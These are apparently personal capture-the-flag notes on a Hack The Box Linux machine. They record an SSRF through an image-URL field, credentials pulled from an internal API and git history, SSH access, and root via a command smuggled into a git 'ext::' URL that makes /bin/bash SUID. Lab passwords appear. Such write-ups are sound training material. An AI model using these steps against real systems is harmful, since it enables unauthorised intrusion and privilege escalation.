# export ip=`10.129.216.229`

# date 16-06-24 || Rohit Tiwari

# os: `Linux (Ubuntu)`,Nginx server

# Nmap scan

> Machine not booting up have to download a comettive vpn for this

```
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp    open     http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
4811/tcp  filtered unknown
19643/tcp filtered unknown
24608/tcp filtered unknown
27308/tcp filtered unknown
39399/tcp filtered unknown
41540/tcp filtered unknown
50857/tcp filtered unknown
63391/tcp filtered unknown
64733/tcp filtered unknown
```

 ## `Things To do`

### PORT 80

- [x] Manual enumeration
- [x] Souce code
- [ ] fuzzing
- [x] Subdomain fuzz
- [ ] Fuzz for parameters like ?=Fuzz
- [ ] look for cred 
- [ ] Sql inection


   
> On Port 80 found a simple webpage woith nginx server 1.18.0
> ![](Attachments/Pasted%20image%2020240616145834.png)
> 

Found a /upload dir may be if can upload some arbiatry file for rce

![](Attachments/Pasted%20image%2020240616145958.png)


> Okay so there's a section to add url to book image tried connecting to myslef using python server worked that confirm SSRF then tried to scan it's own local network got a response 200 with a jpeg file which in execcuting doesn;t show much so tried burp intruder to check for any different port resonse

![](Attachments/Pasted%20image%2020240616165652.png)

> got port 5000 to have differernt response size

okay so response of this port 5000 got a path to image 
![](Attachments/Pasted%20image%2020240616170452.png)

>On searching it on browser found 

![](Attachments/Pasted%20image%2020240616170528.png)


> But got a file downloaded and it contains some api endpoints

![](Attachments/Pasted%20image%2020240616170613.png)


```json
"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library.","endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.","endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.","endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.","endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.","endpoint":"/api/latest/metadata/changelog","methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.","endpoint":"/api/latest/metadata","methods":"GET"}}]}

```

okay so tried this api endpoint got
![](Attachments/Pasted%20image%2020240616171135.png)
>api endpoint 

```
http://127.0.0.1:5000/api/latest/metadata/messages/authors
```

> Then got a path to image and searching found creds

```
{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}
```

Creds : `dev dev080217_devAPI!@`


> Got ssh


```
ssh dev@$ip                                        
The authenticity of host '10.129.216.229 (10.129.216.229)' can't be established.
ED25519 key fingerprint is SHA256:YR+ibhVYSWNLe4xyiPA0g45F4p1pNAcQ7+xupfIR70Q.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.216.229' (ED25519) to the list of known hosts.
dev@10.129.216.229's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)

```


# Privesc

First went to .git dir and did git log to see all logs

![](Attachments/Pasted%20image%2020240616173649.png)

`git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
`

![](Attachments/Pasted%20image%2020240616171828.png)

Got passwd for `prod`  `080217_Producti0n_2023!@`

Then ssh to prod

`sudo -l`

```
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

show tthe script

```
prod@editorial:/opt/internal_apps/clone_changes$ cat  /opt/internal_apps/clone_changes/clone_prod_change.py
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

> in this sciprt first it cahnges the git dir and trieed to colne a repo drom url

googled and found on little trick use this script to make /bin/bash executable with prod user 


```
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chmod% u+s% /bin/bash'
```

then

`/bin/bash -p`

got root

